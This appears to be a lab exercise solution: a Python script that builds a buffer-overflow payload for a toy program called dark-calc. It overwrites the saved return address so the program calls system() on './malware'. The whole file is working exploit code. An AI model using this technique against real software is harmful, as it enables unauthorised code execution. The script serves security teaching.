#!/usr/bin/env python3
"""Task 1: build the payload for attack/dark-calc.

Overflow the 16-byte buffer in input():
  - first 9 bytes make strcpy store "./malware\0" in command_buf (0x6030d0)
  - padding reaches the saved return address at offset 24
  - overwrite the return address with 0x401a6b, the point in eval() where
    rdi is loaded with command_buf and system@plt is called
"""
import struct
import sys

SYSTEM_CALL_SITE = 0x401A6B  # mov edi, 0x6030d0; call system@plt

payload = b"./malware\x00"
payload += b"A" * (24 - len(payload))
payload += struct.pack("<Q", SYSTEM_CALL_SITE)
payload += b"\n"

sys.stdout.buffer.write(payload)
